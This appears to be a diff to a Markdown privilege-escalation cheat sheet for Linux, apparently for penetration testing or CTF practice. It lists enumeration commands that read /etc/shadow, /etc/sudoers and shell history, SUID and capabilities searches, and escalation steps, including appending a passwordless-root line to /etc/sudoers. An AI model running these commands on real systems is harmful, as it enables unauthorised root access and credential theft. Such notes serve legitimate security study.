@@ -1,19 +1,33 @@
-# Enumeration ✅
+# Enumeration ✅📚
 ## Basic-Enumeration ✅
 ```bash
-
-uname -a
+id
 sudo -V
 sudo -l
 history
+uname -a
+bash --version
 
 cat ~/.bashrc
 cat ~/.bash_history
 cat ~/.bash_profile
 
 cat /etc/passwd
+cat /etc/shadow
+cat /etc/sudoers
+cat /etc/crontab
+
+cat /etc/issue (Linux distribution version) 
+cat /etc/*-release (Linux distribution version) 
+cat /proc/version (Linux kernel version)
 
 searchsploit <protocol> <version>
+```
+## SUID_SGID_Capabilities_Files_enumeration ✅
+```
+getcap -r / 2>/dev/null 
+find /  -perm -04000 -ls 2>/dev/null
+find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
 ```
 ## Metasploit-Command-Enumeration ✅
 ```bash
@@ -23,25 +37,7 @@ run post/multi/recon/local_exploit_suggester
 ```
 
 # Privilege-Escalation ✅📚
-## SUID_SGID_Capabilities_Files_enumeration ✅
-```
-getcap -r / 2>/dev/null 
-find /  -perm -04000 -ls 2>/dev/null
-find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
-```
-## Privilege-Escalation_enumeration ✅
-```bash
-id
-history
-sudo -V
-bash --version
-cat /etc/sudoers
-cat /etc/crontab
-uname -a (Linux kernel version)
-cat /etc/issue (Linux distribution version) 
-cat /etc/*-release (Linux distribution version) 
-cat /proc/version (Linux kernel version)
-```
+
 ## Weak File Permissions ✅
 ```bash
 cat /etc/shadow
@@ -65,6 +61,7 @@ password=Mobin@
 
 su <username> ( Switch to new root user )
 ```
+[editing-etc-passwd-file-for-privilege-escalation](http://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
 ### Writable /etc/sudoers ✡️
 ```bash
 echo 'ali ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
